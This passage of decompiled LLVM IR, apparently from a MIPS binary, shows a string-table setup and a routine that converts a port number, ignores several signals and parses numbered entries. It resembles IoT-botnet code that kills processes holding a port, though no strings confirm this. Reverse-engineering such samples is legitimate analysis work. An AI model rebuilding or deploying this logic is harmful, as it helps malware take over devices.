  %v4_400974 = call i32 @function_40061c(i32 25, i32 16, i32 ptrtoint (i32* @global_var_4084b0.43 to i32))
  %v3_400988 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400988, i32* @t9, align 4
  %v4_400990 = call i32 @function_40061c(i32 26, i32 15, i32 ptrtoint (i32* @global_var_4084c4.44 to i32))
  %v3_4009a4 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4009a4, i32* @t9, align 4
  %v4_4009ac = call i32 @function_40061c(i32 27, i32 16, i32 ptrtoint (i32* @global_var_4084d4.45 to i32))
  %v3_4009c0 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4009c0, i32* @t9, align 4
  %v4_4009c8 = call i32 @function_40061c(i32 28, i32 16, i32 ptrtoint (i32* @global_var_4084e8.46 to i32))
  %v3_4009dc = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4009dc, i32* @t9, align 4
  %v5_4009e4 = call i32 @function_40061c(i32 29, i32 50, i32 ptrtoint ([51 x i8]* @global_var_4084fc.47 to i32))
  %v3_4009f8 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4009f8, i32* @t9, align 4
  %v8_400a08 = call i32 @function_40061c(i32 30, i32 52, i32 ptrtoint ([53 x i8]* @global_var_408530.48 to i32))
  %v1_400a18 = load i32, i32* @t9, align 4
  %v1_400a1c = add i32 %v1_400a18, 299380
  %v2_400a1c = inttoptr i32 %v1_400a1c to i32*
  %v3_400a1c = load i32, i32* %v2_400a1c, align 4
  %v1_400a20 = add i32 %v1_400a18, 299584
  %v2_400a20 = inttoptr i32 %v1_400a20 to i32*
  %v3_400a20 = load i32, i32* %v2_400a20, align 4
  call void @__pseudo_branch(i32 %v3_400a20)
  ret i32 %v3_400a1c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_40061c, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
}

define i32 @function_400a30(i32 %arg1) local_unnamed_addr {
dec_label_pc_400a30:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %fp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp37 = alloca i32, align 4
  %tmp38 = alloca i32, align 4
  %tmp39 = alloca i32, align 4
  %tmp40 = alloca i32, align 4
  %tmp41 = alloca i8, align 1
  store i32 0, i32* %s5.global-to-local, align 4
  %v1_400a38 = load i32, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_405830.50 to i32), i32* %t9.global-to-local, align 4
  %v1_400a70 = urem i32 %arg1, 65536
  store i32 %v1_400a70, i32* %s1.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_400a78 = ptrtoint i32* %tmp37 to i32
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_405830.50 to i32))
  %v2_400a88 = ptrtoint i32* %tmp38 to i32
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_405830.50 to i32), i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_405830.50 to i32))
  %v2_400aa0 = ptrtoint i32* %tmp39 to i32
  store i32 %v2_400aa0, i32* %a0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_405830.50 to i32), i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 513, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_405830.50 to i32))
  %v2_400ab8 = ptrtoint i32* %tmp40 to i32
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_405830.50 to i32), i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_405830.50 to i32))
  %v0_400ad0 = load i32, i32* %s1.global-to-local, align 4
  %v3_400ad4 = load i32, i32* @global_var_449bac.51, align 4
  store i32 %v3_400ad4, i32* %t9.global-to-local, align 4
  %v2_400ad8 = ptrtoint i8* %tmp41 to i32
  store i32 %v2_400ad8, i32* %s0.global-to-local, align 4
  %v1_400ad0 = mul i32 %v0_400ad0, 256
  %v1_400adc = and i32 %v1_400ad0, 65280
  %v1_400ae0 = udiv i32 %v0_400ad0, 256
  store i32 %v1_400ae0, i32* %s1.global-to-local, align 4
  %v2_400ae4 = or i32 %v1_400adc, %v1_400ae0
  store i32 %v2_400ae4, i32* %a0.global-to-local, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  store i32 %v2_400ad8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ad4)
  %v3_400afc = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400afc, i32* %t9.global-to-local, align 4
  store i32 %v2_400ad8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400afc)
  store i32 2, i32* %v1.global-to-local, align 4
  %v0_400b14 = load i32, i32* @v0, align 4
  %v2_400b14 = icmp eq i32 %v0_400b14, 2
  store i32 48, i32* %v0.global-to-local, align 4
  br i1 %v2_400b14, label %dec_label_pc_400b18, label %dec_label_pc_400b3c

dec_label_pc_400b18:                              ; preds = %dec_label_pc_400a30
  store i32 0, i32* %v1.global-to-local, align 4
  store i8 48, i8* %tmp41, align 1
  br label %dec_label_pc_400b3c

dec_label_pc_400b3c:                              ; preds = %dec_label_pc_400a30, %dec_label_pc_400b18
  %v3_400b3c = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_400b3c, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b3c)
  %v3_400b54 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_400b54, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b54)
  %v3_400b6c = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_400b6c, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b6c)
  %v3_400b84 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_400b84, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b84)
  %v3_400b9c = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_400b9c, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b9c)
  %v0_400bb0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400bb0, i32* %a0.global-to-local, align 4
  %v3_400bb4 = load i32, i32* @global_var_449b4c.56, align 4
  store i32 %v3_400bb4, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400bb4)
  %v0_400bc4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400bc4, i32* %s2.global-to-local, align 4
  %v2_400bd0 = icmp eq i32 %v0_400bc4, -1
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_400bd0, label %dec_label_pc_400b3c.dec_label_pc_400be0_crit_edge, label %dec_label_pc_400d7c

dec_label_pc_400b3c.dec_label_pc_400be0_crit_edge: ; preds = %dec_label_pc_400b3c
  %v1_400be4.pre.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_400be0

dec_label_pc_400be0:                              ; preds = %dec_label_pc_400b3c.dec_label_pc_400be0_crit_edge, %dec_label_pc_400d7c
  %v1_400be4.pre = phi i32 [ %v1_400be4.pre.pre, %dec_label_pc_400b3c.dec_label_pc_400be0_crit_edge ], [ 0, %dec_label_pc_400d7c ]
  store i32 %v2_400aa0, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400be4

dec_label_pc_400be4:                              ; preds = %dec_label_pc_400bf4, %dec_label_pc_400be0
  %v3_400bf8 = phi i32 [ %v4_400bf8, %dec_label_pc_400bf4 ], [ %v1_400be4.pre, %dec_label_pc_400be0 ]
  %v2_400be4 = add i32 %v3_400bf8, %v2_400aa0
  store i32 %v2_400be4, i32* %v0.global-to-local, align 4
  %v1_400be8 = inttoptr i32 %v2_400be4 to i8*
  %v2_400be8 = load i8, i8* %v1_400be8, align 1
  %v3_400be8 = sext i8 %v2_400be8 to i32
  store i32 %v3_400be8, i32* %a0.global-to-local, align 4
  %v1_400bf0 = icmp eq i8 %v2_400be8, 0
  store i32 58, i32* %v0.global-to-local, align 4
  br i1 %v1_400bf0, label %dec_label_pc_400d7c, label %dec_label_pc_400bf4

dec_label_pc_400bf4:                              ; preds = %dec_label_pc_400be4
  %v2_400bf8 = icmp eq i8 %v2_400be8, 58
  %v4_400bf8 = add i32 %v3_400bf8, 1
  store i32 %v4_400bf8, i32* %v1.global-to-local, align 4
  br i1 %v2_400bf8, label %dec_label_pc_400bfc, label %dec_label_pc_400be4

dec_label_pc_400bfc:                              ; preds = %dec_label_pc_400bf4
  store i32 %v3_400bf8, i32* %v1.global-to-local, align 4
  %v1_400c04 = add i32 %v3_400bf8, 2
  store i32 %v1_400c04, i32* %a0.global-to-local, align 4
  %v2_400c08 = add i32 %v1_400c04, %v2_400aa0
  store i32 %v2_400c08, i32* %v0.global-to-local, align 4
  store i32 %v1_400c04, i32* %s1.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400c14

dec_label_pc_400c14:                              ; preds = %dec_label_pc_400c20, %dec_label_pc_400bfc
  %v3_400c24 = phi i32 [ %v4_400c24, %dec_label_pc_400c20 ], [ %v1_400c04, %dec_label_pc_400bfc ]
  %v0_400c14 = phi i32 [ %v3_400c1c, %dec_label_pc_400c20 ], [ %v2_400c08, %dec_label_pc_400bfc ]
  %v1_400c14 = inttoptr i32 %v0_400c14 to i8*
  %v2_400c14 = load i8, i8* %v1_400c14, align 1
  %v3_400c14 = sext i8 %v2_400c14 to i32
  store i32 %v3_400c14, i32* %v1.global-to-local, align 4
  %v1_400c1c = icmp eq i8 %v2_400c14, 0
  %v3_400c1c = add i32 %v0_400c14, 1
  store i32 %v3_400c1c, i32* %v0.global-to-local, align 4
  br i1 %v1_400c1c, label %dec_label_pc_400c30, label %dec_label_pc_400c20

dec_label_pc_400c20:                              ; preds = %dec_label_pc_400c14
  %v2_400c24 = icmp eq i8 %v2_400c14, 32
  %v4_400c24 = add i32 %v3_400c24, 1
  store i32 %v4_400c24, i32* %s1.global-to-local, align 4
  br i1 %v2_400c24, label %dec_label_pc_400c28, label %dec_label_pc_400c14

dec_label_pc_400c28:                              ; preds = %dec_label_pc_400c20
  store i32 %v3_400c24, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400c30

dec_label_pc_400c30:                              ; preds = %dec_label_pc_400c14, %dec_label_pc_400c28
  %v3_400c34 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400c34, i32* %t9.global-to-local, align 4
  store i32 %v2_400c08, i32* %s0.global-to-local, align 4
  %v0_400c3c = load i32, i32* @sp, align 4
  %v2_400c3c = add i32 %v0_400c3c, %v3_400c24
  store i32 %v2_400c3c, i32* %v0.global-to-local, align 4
  store i32 %v2_400c08, i32* %a0.global-to-local, align 4
  %v2_400c44 = add i32 %v2_400c3c, 56
  %v3_400c44 = inttoptr i32 %v2_400c44 to i8*
  store i8 0, i8* %v3_400c44, align 1
  call void @__pseudo_call(i32 %v3_400c34)
  %v0_400c50 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_400c50, i32* %a0.global-to-local, align 4
  %v3_400c54 = load i32, i32* @global_var_449d04.58, align 4
  store i32 %v3_400c54, i32* %t9.global-to-local, align 4
  %v0_400c58 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400c58, i32* %a1.global-to-local, align 4
  store i32 %v2_400ad8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400c54)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_400c6c = load i32, i32* %v0.global-to-local, align 4
  %v2_400c6c = icmp eq i32 %v0_400c6c, -1
  %v3_400c6c = load i32, i32* %s1.global-to-local, align 4
  %v4_400c6c = add i32 %v3_400c6c, 1
  store i32 %v4_400c6c, i32* %a0.global-to-local, align 4
  br i1 %v2_400c6c, label %dec_label_pc_400d7c, label %dec_label_pc_400c70

dec_label_pc_400c70:                              ; preds = %dec_label_pc_400c30
  br label %dec_label_pc_400c80

dec_label_pc_400c80:                              ; preds = %dec_label_pc_400ce8, %dec_label_pc_400c70
  %v0_400d0017 = phi i32 [ %v0_400d0018, %dec_label_pc_400ce8 ], [ 0, %dec_label_pc_400c70 ]
  %v0_400cd013 = phi i32 [ %v0_400cd014, %dec_label_pc_400ce8 ], [ 0, %dec_label_pc_400c70 ]
  %v2_400cf8 = phi i32 [ %v3_400cf8, %dec_label_pc_400ce8 ], [ %v4_400c6c, %dec_label_pc_400c70 ]
  %v0_400c8c = phi i32 [ %v3_400cf0, %dec_label_pc_400ce8 ], [ -1, %dec_label_pc_400c70 ]
  %v2_400c84 = icmp eq i32 %v0_400c8c, 32
  store i32 9, i32* %v0.global-to-local, align 4
  br i1 %v2_400c84, label %dec_label_pc_400ccc, label %dec_label_pc_400c88

dec_label_pc_400c88:                              ; preds = %dec_label_pc_400c80
  %v2_400c8c = icmp eq i32 %v0_400c8c, 9
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400c8c, label %dec_label_pc_400ccc, label %dec_label_pc_400c90

dec_label_pc_400c90:                              ; preds = %dec_label_pc_400c88
  %v0_400c94 = load i32, i32* %a2.global-to-local, align 4
  %v2_400c94 = icmp eq i32 %v0_400c94, 1
  br i1 %v2_400c94, label %dec_label_pc_400c98, label %dec_label_pc_400cc4

dec_label_pc_400c98:                              ; preds = %dec_label_pc_400c90
  %v1_400c9c = add i32 %v0_400cd013, 1
  %v2_400ca0 = icmp eq i32 %v0_400cd013, 0
  store i32 0, i32* %a2.global-to-local, align 4
  br i1 %v2_400ca0, label %dec_label_pc_400ca4, label %dec_label_pc_400cd0

dec_label_pc_400ca4:                              ; preds = %dec_label_pc_400c98
  %v0_400ca8 = load i32, i32* @sp, align 4
  %v2_400ca8 = add i32 %v0_400ca8, %v2_400cf8
  store i32 %v2_400ca8, i32* %v0.global-to-local, align 4
  %v1_400cac = add i32 %v2_400ca8, 57
  %v2_400cac = inttoptr i32 %v1_400cac to i8*
  %v3_400cac = load i8, i8* %v2_400cac, align 1
  %v4_400cac = sext i8 %v3_400cac to i32
  store i32 %v4_400cac, i32* %v1.global-to-local, align 4
  %v2_400cb4 = icmp eq i8 %v3_400cac, 65
  store i32 %v2_400ca8, i32* %v0.global-to-local, align 4
  br i1 %v2_400cb4, label %dec_label_pc_400cb8, label %dec_label_pc_400ce8

dec_label_pc_400cb8:                              ; preds = %dec_label_pc_400ca4
  br label %dec_label_pc_400cc4

dec_label_pc_400cc4:                              ; preds = %dec_label_pc_400c90, %dec_label_pc_400cb8
  %v0_400d0022 = phi i32 [ %v0_400d0017, %dec_label_pc_400c90 ], [ 1, %dec_label_pc_400cb8 ]
  %v0_400cd011 = phi i32 [ %v0_400cd013, %dec_label_pc_400c90 ], [ 1, %dec_label_pc_400cb8 ]
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400ccc

dec_label_pc_400ccc:                              ; preds = %dec_label_pc_400c88, %dec_label_pc_400c80, %dec_label_pc_400cc4
  %v0_400d0021 = phi i32 [ %v0_400d0017, %dec_label_pc_400c88 ], [ %v0_400d0017, %dec_label_pc_400c80 ], [ %v0_400d0022, %dec_label_pc_400cc4 ]
  %v0_400cd012 = phi i32 [ %v0_400cd013, %dec_label_pc_400c88 ], [ %v0_400cd013, %dec_label_pc_400c80 ], [ %v0_400cd011, %dec_label_pc_400cc4 ]
  store i32 1, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400cd0

dec_label_pc_400cd0:                              ; preds = %dec_label_pc_400c98, %dec_label_pc_400ccc
  %v0_400d0020 = phi i32 [ %v0_400d0017, %dec_label_pc_400c98 ], [ %v0_400d0021, %dec_label_pc_400ccc ]
  %v0_400cd0 = phi i32 [ %v1_400c9c, %dec_label_pc_400c98 ], [ %v0_400cd012, %dec_label_pc_400ccc ]
  %v1_400cd0 = icmp slt i32 %v0_400cd0, 7
  %v2_400cd0 = zext i1 %v1_400cd0 to i32
  store i32 %v2_400cd0, i32* %v0.global-to-local, align 4
  %v1_400cd4 = icmp eq i1 %v1_400cd0, false
  %v2_400cd4 = load i32, i32* %a1.global-to-local, align 4
  %v3_400cd4 = add i32 %v2_400cd4, 1
  store i32 %v3_400cd4, i32* %a1.global-to-local, align 4
  br i1 %v1_400cd4, label %dec_label_pc_400d00, label %dec_label_pc_400cd8

dec_label_pc_400cd8:                              ; preds = %dec_label_pc_400cd0
  %v0_400ce4 = load i32, i32* @sp, align 4
  %v2_400ce4 = add i32 %v0_400ce4, %v2_400cf8
  store i32 %v2_400ce4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400ce8

dec_label_pc_400ce8:                              ; preds = %dec_label_pc_400ca4, %dec_label_pc_400cd8
  %v0_400d0018 = phi i32 [ %v0_400d0017, %dec_label_pc_400ca4 ], [ %v0_400d0020, %dec_label_pc_400cd8 ]
  %v0_400ce8 = phi i32 [ %v2_400ca8, %dec_label_pc_400ca4 ], [ %v2_400ce4, %dec_label_pc_400cd8 ]
  %v0_400cd014 = phi i32 [ 1, %dec_label_pc_400ca4 ], [ %v0_400cd0, %dec_label_pc_400cd8 ]
  %v1_400ce8 = add i32 %v0_400ce8, 57
  store i32 %v1_400ce8, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_400cf0 = inttoptr i32 %v1_400ce8 to i8*
  %v2_400cf0 = load i8, i8* %v1_400cf0, align 1
  %v3_400cf0 = sext i8 %v2_400cf0 to i32
  store i32 %v3_400cf0, i32* %v1.global-to-local, align 4
  %v1_400cf8 = icmp eq i8 %v2_400cf0, 0
  %v3_400cf8 = add i32 %v2_400cf8, 1
  store i32 %v3_400cf8, i32* %a0.global-to-local, align 4
  br i1 %v1_400cf8, label %dec_label_pc_400d00, label %dec_label_pc_400c80

dec_label_pc_400d00:                              ; preds = %dec_label_pc_400ce8, %dec_label_pc_400cd0
  %v1_400d38 = phi i32 [ %v3_400cf8, %dec_label_pc_400ce8 ], [ %v2_400cf8, %dec_label_pc_400cd0 ]
  %v0_400d00 = phi i32 [ %v0_400d0018, %dec_label_pc_400ce8 ], [ %v0_400d0020, %dec_label_pc_400cd0 ]
  %v1_400d00 = icmp eq i32 %v0_400d00, 0
  store i32 %v1_400d38, i32* %a2.global-to-local, align 4
  br i1 %v1_400d00, label %dec_label_pc_400d7c, label %dec_label_pc_400d04

dec_label_pc_400d04:                              ; preds = %dec_label_pc_400d00
  %v2_400d0c = add i32 %v1_400d38, %v2_400aa0
  store i32 %v2_400d0c, i32* %v0.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_400d14

dec_label_pc_400d14:                              ; preds = %dec_label_pc_400d20, %dec_label_pc_400d04
  %v3_400d24 = phi i32 [ %v4_400d24, %dec_label_pc_400d20 ], [ %v1_400d38, %dec_label_pc_400d04 ]
  %v0_400d14 = phi i32 [ %v3_400d1c, %dec_label_pc_400d20 ], [ %v2_400d0c, %dec_label_pc_400d04 ]
  %v1_400d14 = inttoptr i32 %v0_400d14 to i8*
  %v2_400d14 = load i8, i8* %v1_400d14, align 1
  %v3_400d14 = sext i8 %v2_400d14 to i32
  store i32 %v3_400d14, i32* %v1.global-to-local, align 4
  %v1_400d1c = icmp eq i8 %v2_400d14, 0
  %v3_400d1c = add i32 %v0_400d14, 1
  store i32 %v3_400d1c, i32* %v0.global-to-local, align 4
  br i1 %v1_400d1c, label %dec_label_pc_400d30, label %dec_label_pc_400d20

dec_label_pc_400d20:                              ; preds = %dec_label_pc_400d14
  %v2_400d24 = icmp eq i8 %v2_400d14, 32
  %v4_400d24 = add i32 %v3_400d24, 1
  store i32 %v4_400d24, i32* %a2.global-to-local, align 4
  br i1 %v2_400d24, label %dec_label_pc_400d28, label %dec_label_pc_400d14

dec_label_pc_400d28:                              ; preds = %dec_label_pc_400d20
  store i32 %v3_400d24, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400d30

dec_label_pc_400d30:                              ; preds = %dec_label_pc_400d14, %dec_label_pc_400d28
  store i32 %v2_400ab8, i32* %s1.global-to-local, align 4
  store i32 %v2_400d0c, i32* %s0.global-to-local, align 4
  %v3_400d3c = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400d3c, i32* %t9.global-to-local, align 4
  %v2_400d40 = add i32 %v3_400d24, %v2_400ab8
  store i32 %v2_400d40, i32* %v0.global-to-local, align 4
  %v1_400d44 = add i32 %v2_400d40, 32
  %v2_400d44 = inttoptr i32 %v1_400d44 to i8*
  store i8 0, i8* %v2_400d44, align 1
  %v1_400d48 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400d48, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d3c)
  %v0_400d50 = load i32, i32* %v0.global-to-local, align 4
  %v1_400d50 = icmp slt i32 %v0_400d50, 16
  %v2_400d50 = zext i1 %v1_400d50 to i32
  store i32 %v2_400d50, i32* %v0.global-to-local, align 4
  %v1_400d58 = icmp eq i1 %v1_400d50, false
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  br i1 %v1_400d58, label %dec_label_pc_400d7c, label %dec_label_pc_400d5c

dec_label_pc_400d5c:                              ; preds = %dec_label_pc_400d30
  %v3_400d60 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400d60, i32* %t9.global-to-local, align 4
  %v1_400d68 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400d68, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d60)
  br label %dec_label_pc_400d7c

dec_label_pc_400d7c:                              ; preds = %dec_label_pc_400be4, %dec_label_pc_400b3c, %dec_label_pc_400d30, %dec_label_pc_400d00, %dec_label_pc_400c30, %dec_label_pc_400d5c
  %v1_400d7c = add i32 %v1_400a38, 299684
  %v2_400d7c = inttoptr i32 %v1_400d7c to i32*
  %v3_400d7c = load i32, i32* %v2_400d7c, align 4
  store i32 %v3_400d7c, i32* %t9.global-to-local, align 4
  store i32 %v2_400aa0, i32* %a0.global-to-local, align 4
  store i32 512, i32* %a1.global-to-local, align 4
  %v1_400d88 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_400d88, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d7c)
  %v0_400d94 = load i32, i32* %v0.global-to-local, align 4
  %v1_400d94 = icmp eq i32 %v0_400d94, 0
  store i32 0, i32* %v1.global-to-local, align 4
  br i1 %v1_400d94, label %dec_label_pc_400d98, label %dec_label_pc_400be0

dec_label_pc_400d98:                              ; preds = %dec_label_pc_400d7c
  %v3_400d9c = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_400d9c, i32* %t9.global-to-local, align 4
  %v1_400da4 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_400da4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400d9c)
  %v3_400db4 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400db4, i32* %t9.global-to-local, align 4
  store i32 %v2_400ab8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400db4)
  %v0_400dc8 = load i32, i32* %v0.global-to-local, align 4
  %v1_400dc8 = icmp eq i32 %v0_400dc8, 0
  br i1 %v1_400dc8, label %dec_label_pc_400dcc, label %dec_label_pc_400e34

dec_label_pc_400dcc:                              ; preds = %dec_label_pc_400d98
  %v3_400dd0 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_400dd0, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400dd0)
  %v3_400de8 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_400de8, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400de8)
  %v3_400e00 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_400e00, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e00)
  %v3_400e18 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_400e18, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e18)
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400e34

dec_label_pc_400e34:                              ; preds = %dec_label_pc_400d98, %dec_label_pc_400dcc
  %v3_400e34 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_400e34, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e34)
  %v3_400e4c = load i32, i32* @global_var_449bc4.62, align 4
  store i32 %v3_400e4c, i32* %t9.global-to-local, align 4
  %v1_400e54 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400e54, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e4c)
  %v0_400e60 = load i32, i32* %v0.global-to-local, align 4
  %v1_400e60 = icmp eq i32 %v0_400e60, 0
  store i32 %v0_400e60, i32* %s6.global-to-local, align 4
  br i1 %v1_400e60, label %dec_label_pc_400e64, label %dec_label_pc_400e70

dec_label_pc_400e64:                              ; preds = %dec_label_pc_400e34
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_400e70

dec_label_pc_400e70:                              ; preds = %dec_label_pc_400e34, %dec_label_pc_400e64
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_400e78.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_40121c = add i32 %v1_400a38, 299624
  %v2_40121c = inttoptr i32 %v1_40121c to i32*
  br label %dec_label_pc_400e78

dec_label_pc_400e78:                              ; preds = %dec_label_pc_40121c, %dec_label_pc_400e70
  %v2_400e8c = phi i32 [ %v0_401230, %dec_label_pc_40121c ], [ %v0_400e78.pre, %dec_label_pc_400e70 ]
  %v1_400e78 = add i32 %v2_400e8c, 11
  %v2_400e78 = inttoptr i32 %v1_400e78 to i8*
  %v3_400e78 = load i8, i8* %v2_400e78, align 1
  %v4_400e78 = zext i8 %v3_400e78 to i32
  %v1_400e80 = add nuw nsw i32 %v4_400e78, 208
  %v1_400e84 = and i32 %v1_400e80, 254
  %v1_400e88 = icmp ult i32 %v1_400e84, 10
  %v2_400e88 = zext i1 %v1_400e88 to i32
  store i32 %v2_400e88, i32* %v0.global-to-local, align 4
  %v1_400e8c = icmp eq i1 %v1_400e88, false
  store i32 %v1_400e78, i32* %s4.global-to-local, align 4
  br i1 %v1_400e8c, label %dec_label_pc_40121c, label %dec_label_pc_400e90

dec_label_pc_400e90:                              ; preds = %dec_label_pc_400e78
  %v3_400e94 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_400e94, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400e94)
  store i32 %v2_400a78, i32* %s1.global-to-local, align 4
  %v3_400eac = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400eac, i32* %t9.global-to-local, align 4
  %v0_400eb0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400eb0, i32* %a1.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400eac)
  %v3_400ec4 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400ec4, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ec4)
  %v0_400ed8 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_400ed8, i32* %a1.global-to-local, align 4
  %v3_400edc = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400edc, i32* %t9.global-to-local, align 4
  %v1_400ee4 = load i32, i32* %s1.global-to-local, align 4
  %v2_400ee4 = load i32, i32* %v0.global-to-local, align 4
  %v3_400ee4 = add i32 %v2_400ee4, %v1_400ee4
  store i32 %v3_400ee4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400edc)
  %v3_400ef4 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400ef4, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ef4)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_400f0c = load i32, i32* @global_var_449ce0.54, align 4
